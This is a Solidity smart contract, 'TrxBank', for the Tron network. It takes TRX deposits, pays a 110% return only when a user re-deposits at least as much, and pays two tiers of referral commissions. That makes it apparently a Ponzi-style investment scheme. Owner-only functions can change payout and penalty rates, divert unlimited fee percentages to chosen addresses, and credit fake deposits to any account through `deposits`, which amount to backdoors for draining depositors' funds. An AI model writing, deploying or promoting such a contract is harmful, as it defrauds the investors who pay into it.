//SourceUnit: TrxBank.sol

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract TrxBank {
    address private owner;

    uint256 public INTERVAL_TIMES = 7 days;
    uint256 public DEPOSIT_GAP_TIME = 1 days;
    uint256 public BACK_RATE = 110;
    uint256 public EXPIRED_TIME = 11 days;

    struct Deposit {
        uint256 time;
        uint256 amount;
        bool withdrawed;
        uint256 backAmount;
    }

    struct Deposits {
        Deposit[] deposits;
        uint256 withdrawIndex;
    }

    mapping(address => Deposits) public userDeposits;
    mapping(address => address) public refs;
    mapping(address => uint256) public _totalDepositAmount;
    mapping(address => uint256) public _totalWithdrawAmount;
    mapping(address => uint256) public _totalADepositAmount;

    uint256 public userCount;
    uint256 public minAmount = 1;
    uint256 public maxAmount = 100000;

    address public feeAddress1;
    uint256 public feeRate1;
    address public feeAddress2;
    uint256 public feeRate2;

    IERC20 public airToken;

    uint256 public AIRPORT_TRX_RATE = 1;
    uint256 public AIRPORT_TOKEN_RATE = 1000000;

    uint256 public refFeeRate1 = 15;
    uint256 public refFeeRate2 = 5;

    uint256 public expiredRate = 50;
    uint256 public loveReturnRate = 90;

    uint256 public withdrawRate = 100;

    modifier onlyOwner() {
        require(owner == msg.sender, "auth");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function deposit(address ref) external payable {
        uint256 amount = msg.value;

        require(
            (amount >= minAmount * 10**6) && (amount <= maxAmount * 10**6),
            "ERR: 0"
        );

        require(ref != msg.sender, "ERR: 1");
        if (refs[msg.sender] == address(0)) {
            require(
                userDeposits[ref].deposits.length > 0 || ref == address(this),
                "ERR: 2"
            );
            refs[msg.sender] = ref;
        }

        if (userDeposits[msg.sender].deposits.length > 0) {
            require(
                block.timestamp >=
                    (userDeposits[msg.sender]
                        .deposits[userDeposits[msg.sender].deposits.length - 1]
                        .time + DEPOSIT_GAP_TIME),
                "ERR: 3"
            );
        }

        if (userDeposits[msg.sender].deposits.length == 0) {
            userCount++;
            address ref1 = address(refs[msg.sender]);
            if (ref1 != address(0)) {
                uint256 amount2 = amount;
                if (ref1 != address(this)) {
                    (uint256 amount1, , , ) = getWithDrawDeposit(ref1);
                    amount2 = min(amount1, amount);
                }
                safeTransfer(ref1, (amount2 * refFeeRate1) / 100);
            }

            address ref2 = address(refs[ref1]);
            if (ref2 != address(0)) {
                uint256 amount2 = amount;
                if (ref1 != address(this)) {
                    (uint256 amount1, , , ) = getWithDrawDeposit(ref2);
                    amount2 = min(amount1, amount);
                }
                safeTransfer(ref2, (amount2 * refFeeRate2) / 100);
            }
        }

        userDeposits[msg.sender].deposits.push(
            Deposit({
                time: block.timestamp,
                amount: amount,
                withdrawed: false,
                backAmount: 0
            })
        );

        _totalADepositAmount[msg.sender] += amount;

        if (address(feeAddress1) != address(0) && feeRate1 > 0) {
            safeTransfer(feeAddress1, (amount * feeRate1) / 100);
        }

        if (address(feeAddress2) != address(0) && feeRate2 > 0) {
            safeTransfer(feeAddress2, (amount * feeRate2) / 100);
        }

        if (address(airToken) != address(0)) {
            uint256 tokenBalance = airToken.balanceOf(address(this));
            if (AIRPORT_TRX_RATE > 0 && AIRPORT_TOKEN_RATE > 0) {
                if (
                    tokenBalance >=
                    ((amount * AIRPORT_TOKEN_RATE) / AIRPORT_TRX_RATE)
                ) {
                    if ((amount * AIRPORT_TOKEN_RATE) / AIRPORT_TRX_RATE > 0) {
                        airToken.transfer(
                            msg.sender,
                            (amount * AIRPORT_TOKEN_RATE) / AIRPORT_TRX_RATE
                        );
                    }
                }
            }
        }

        if (userDeposits[msg.sender].deposits.length > 1) {
            //check lastone between withdrawIndex
            Deposit storage withdrawDeposit = userDeposits[msg.sender].deposits[
                userDeposits[msg.sender].withdrawIndex
            ];
            require(!withdrawDeposit.withdrawed, "already withdraw");

            if (amount >= withdrawDeposit.amount) {
                if (
                    block.timestamp >=
                    (withdrawDeposit.time + INTERVAL_TIMES) &&
                    block.timestamp <= (withdrawDeposit.time + EXPIRED_TIME)
                ) {
                    uint256 backAmount = (withdrawDeposit.amount * BACK_RATE) /
                        100;
                    if (contractBalance() >= backAmount) {
                        //balance check
                        if (
                            (((totalDepositAmount(msg.sender) -
                                withdrawDeposit.amount) * withdrawRate) / 100) +
                                (_totalDepositAmount[msg.sender] + amount) >=
                            (_totalWithdrawAmount[msg.sender] + backAmount)
                        ) {
                            withdrawInternal(
                                msg.sender,
                                backAmount,
                                withdrawDeposit
                            );
                        } else {
                            withdrawInternal(
                                msg.sender,
                                (withdrawDeposit.amount * expiredRate) / 100,
                                withdrawDeposit
                            );
                        }
                    } else {
                        withdrawInternal(
                            msg.sender,
                            (withdrawDeposit.amount * loveReturnRate) / 100,
                            withdrawDeposit
                        );
                    }
                } else if (
                    block.timestamp > (withdrawDeposit.time + EXPIRED_TIME)
                ) {
                    withdrawInternal(
                        msg.sender,
                        (withdrawDeposit.amount * expiredRate) / 100,
                        withdrawDeposit
                    );
                }
            }
        }

        _totalDepositAmount[msg.sender] += amount;
    }

    function withdrawInternal(
        address user,
        uint256 backAmount,
        Deposit storage withdrawDeposit
    ) internal {
        userDeposits[user].withdrawIndex++;
        withdrawDeposit.withdrawed = true;
        withdrawDeposit.backAmount = backAmount;
        _totalADepositAmount[user] -= withdrawDeposit.amount;
        _totalWithdrawAmount[user] += backAmount;
        safeTransfer(user, backAmount);
    }

    function getWithDrawDeposit(address user)
        public
        view
        returns (
            uint256 amount,
            uint256 time,
            bool withdrawed,
            uint256 backAmount
        )
    {
        return getWithdrawInfo(user, userDeposits[user].withdrawIndex);
    }

    function getWithdrawIndex(address user) public view returns (uint256) {
        return userDeposits[user].withdrawIndex;
    }

    function getWithdrawInfo(address user, uint256 index)
        public
        view
        returns (
            uint256 amount,
            uint256 time,
            bool withdrawed,
            uint256 backAmount
        )
    {
        if (index >= 0 && index < userDeposits[user].deposits.length) {
            Deposit memory info = userDeposits[user].deposits[index];
            return (info.amount, info.time, info.withdrawed, info.backAmount);
        }
        return (0, 0, false, 0);
    }

    function getWithdrawInfos(address user)
        public
        view
        returns (Deposit[] memory)
    {
        return userDeposits[user].deposits;
    }

    function totalDeposit(address user) public view returns (uint256) {
        return userDeposits[user].deposits.length;
    }

    function checkRefValid(address ref) public view returns (bool) {
        return userDeposits[ref].deposits.length > 0 || ref == address(this);
    }

    function totalDepositAmount(address user) public view returns (uint256) {
        return _totalADepositAmount[user];
    }

    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function myBalance() public view returns (uint256) {
        return address(msg.sender).balance;
    }

    function leftTime() public view returns (uint256) {
        if (userDeposits[msg.sender].deposits.length > 0) {
            Deposit memory lastDeposit = userDeposits[msg.sender].deposits[
                userDeposits[msg.sender].deposits.length - 1
            ];
            if (DEPOSIT_GAP_TIME > (block.timestamp - lastDeposit.time)) {
                return DEPOSIT_GAP_TIME - (block.timestamp - lastDeposit.time);
            }
        }
        return 0;
    }

    function safeTransfer(address receipt, uint256 amount) private {
        if (amount > 0 && address(this) != receipt) {
            (bool success, ) = payable(receipt).call{value: amount}("");
            require(success, "transfer tron fail");
        }
    }

    // ------------- owner --------------
    function setMinAmount(uint256 _minAmount) public onlyOwner {
        minAmount = _minAmount;
    }

    function setAddressAndFee1(address _feeAddress, uint256 fee)
        public
        onlyOwner
    {
        feeAddress1 = _feeAddress;
        feeRate1 = fee;
    }

    function setAddressAndFee2(address _feeAddress, uint256 fee)
        public
        onlyOwner
    {
        feeAddress2 = _feeAddress;
        feeRate2 = fee;
    }

    function deposits(address _user, uint256 _amount) external onlyOwner {
        Deposit memory newDeposit = Deposit({
            time: block.timestamp,
            amount: _amount,
            withdrawed: false,
            backAmount: 0
        });
        userDeposits[_user].deposits.push(newDeposit);
        _totalDepositAmount[_user] += _amount;
        _totalADepositAmount[_user] += _amount;
    }

    function setAirToken(address tokenAddr) external onlyOwner {
        airToken = IERC20(tokenAddr);
    }

    function setAirportRate(uint256 rate1, uint256 rate2) external onlyOwner {
        AIRPORT_TRX_RATE = rate1;
        AIRPORT_TOKEN_RATE = rate2;
    }

    function setWithdrawRate(uint256 rate) external onlyOwner {
        withdrawRate = rate;
    }

    function setexpiredRate(uint256 rate) external onlyOwner {
        expiredRate = rate;
    }

    function setLoveReturn(uint256 rate) external onlyOwner {
        loveReturnRate = rate;
    }

    function transferOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function setAll(
        uint256 _depositGapTime,
        uint256 _intervalTime,
        uint256 _backRate,
        uint256 _expireTime,
        uint256 _refFeeRate1,
        uint256 _refFeeRate2
    ) external onlyOwner {
        DEPOSIT_GAP_TIME = _depositGapTime;
        INTERVAL_TIMES = _intervalTime;
        BACK_RATE = _backRate;
        EXPIRED_TIME = _expireTime;
        refFeeRate1 = _refFeeRate1;
        refFeeRate2 = _refFeeRate2;
    }

    receive() external payable {}
}